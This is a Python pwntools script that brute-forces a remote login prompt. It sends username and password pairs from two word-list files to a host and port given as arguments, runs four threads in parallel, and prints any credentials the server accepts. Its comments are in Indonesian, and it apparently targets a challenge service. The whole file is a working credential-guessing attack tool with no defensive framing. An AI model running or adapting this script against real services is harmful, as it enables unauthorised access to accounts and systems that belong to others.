import sys
import re
from pwn import *
from concurrent.futures import ThreadPoolExecutor

HOST = sys.argv[1]
PORT = int(sys.argv[2])

USERNAME_FILE = 'username.txt'
PASSWORD_FILE = 'password.txt'

context.log_level = 'critical'

def worker(user, pwd):
    try:
        r = remote(HOST, PORT, timeout=5)
    
        r.recvuntil(b"Username: ", timeout=3)
        r.sendline(user.encode())
        r.recvline(timeout=2)
        r.recvuntil(b"Password: ", timeout=3)
        r.sendline(pwd.encode())
        r.recvline(timeout=2)

        response = r.recvrepeat(timeout=1.0).decode('latin-1', errors='ignore').strip()

        if "Invalid" not in response and response != "":
            print(f"\n[======== MATCH FOUND! ========]")
            print(f"[+] User : {user}")
            print(f"[+] Pass : {pwd}")
            print(f"[+] Server Output :\n{response}")
            print(f"[===============================\n")
            r.close()
            return True

        r.close()
    except Exception:
        pass
    return False

def bruteforce():
    with open(USERNAME_FILE, 'r', encoding='latin-1') as f1, open(PASSWORD_FILE, 'r', encoding='latin-1') as f2:
        pairs = [(l1.strip(), l2.strip()) for l1, l2 in zip(f1, f2)]

    print(f"[*] Menjalankan verifikasi presisi tinggi ({len(pairs)} pasang)...")

    # Gunakan 3-5 worker agar server tidak memberikan respon acak/drop koneksi
    with ThreadPoolExecutor(max_workers=4) as executor:
        for user, pwd in pairs:
            executor.submit(worker, user, pwd)

if __name__ == '__main__':
    bruteforce()